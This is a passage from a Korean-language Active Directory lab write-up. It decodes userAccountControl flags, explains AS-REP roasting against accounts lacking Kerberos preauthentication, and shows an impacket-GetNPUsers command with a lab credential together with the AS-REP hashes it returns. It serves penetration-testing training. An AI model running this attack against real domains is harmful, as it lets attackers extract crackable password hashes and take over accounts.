mmorgan  CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-04-05 15:34:54.924573  2022-03-10 14:48:06.096160  0x410200 
ygroce   CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-04-05 15:34:43.283941  <never>                     0x410220
```

`0x410200` 과 `0x410220` 은 각각 여러 `userAccountControl` 플래그가 합쳐진 비트마스크 값이다.

`0x410200` 은 `NORMAL_ACCOUNT (0x0200)` + `DONT_EXPIRE_PASSWORD (0x10000)` + `DONT_REQ_PREAUTH (0x400000)`의 조합이다.

`0x410220` 은 위 조합에 `PASSWD_NOTREQD (0x0020)`가 추가된 값이다.

따라서 두 계정 모두 핵심적으로 `DONT_REQ_PREAUTH` 가 설정되어 있으며, `DONT_REQ_PREAUTH` 는 Kerberos 인증 자체가 필요 없다는 의미가 아니다. 

KDC가 사용자의 사전 인증 데이터를 확인하지 않고 AS-REP를 반환한다는 의미이다.

AS-REP의 일부는 사용자 비밀번호에서 파생된 키로 암호화되어 있으므로, 공격자는 이를 받아 오프라인 크랙을 시도할 수 있다.

이 공격은 Kerberoasting과 달리 사용자에게 SPN이 설정되어 있을 필요가 없다.

따라서 `mmorgan` 과 `ygroce` 처럼 `DONT_REQ_PREAUTH` 가 설정된 계정에 대해 `GetNPUsers -request` 로 AS-REP 해시를 요청할 수 있다:

```bash
$ proxychains impacket-GetNPUsers 'inlanefreight.local/wley:transporter@4' -dc-ip 172.16.5.5 -request

Name     MemberOf                                                           PasswordLastSet             LastLogon                   UAC      
-------  -----------------------------------------------------------------  --------------------------  --------------------------  --------
mmorgan  CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-04-05 15:34:54.924573  2022-03-10 14:48:06.096160  0x410200 
ygroce   CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-04-05 15:34:43.283941  <never>                     0x410220 

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:013b6fb87a83596f4d638f5cc193049c$02d69d5371ad4a7af3fff8949b8ff0775e562f83fff5e91bfc611487dc92419975556fd8fe169454530fdb21b593731140fc7f9de311a146cca0d5bb495f3eb7dad26f0b618236f7564ec53e7735476a18e87ff53c072e9cb82937bbfaab8463584463958905b7c3f39b0bb316fb12683cc0c7e917415af565cf6f617203065e8f0cba4832889651d557e9d568a0861661c724e97437a7e1c40fedfb32b65690e00c373e502954999a47b58e12e2ab88d9b232be71a09a2cd5bbc36757bd8db5885c942d486f6f226aea61389a72198f41caf2ea97bb64a1d6f80f3dcb2fcbfa15035e15f0118f1f039e817d6cfef66c0fc579edc0292821c34f

$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:a245c4540f0a994e66620e32afbe8480$9320954e41acec4912f6122f6870990fef3c98a4dc2a6db1fe1cf42225a3c13aee4865df560eb65b626ffc482e4ac15d770623bc7fad2fd65477ed5e9359c8304dbe5e180157a5a78adc7975db3140996a45bb1c14cfa8f83d03d321ed2cd7180b17ad7d7977b8070044e740512ef0842ee2c9d7f1f1bdce609d06b68af2f1bdc43a4db30fc3259cca81dc867aadccd9ceb5f5d124566c1382e2f779c96ab7c281ffce2fbfe37137024207cb31a573616271d28c234d5fe0be240ec511b9abb0e650a79a4fc840a4d96ed15478864cbdd208d024f9fe9cbba8fcf8d7bcc03ff3f13c1bdfc3cb07faf5c8d31827ec1f7865db01ea1b22dcea020f
```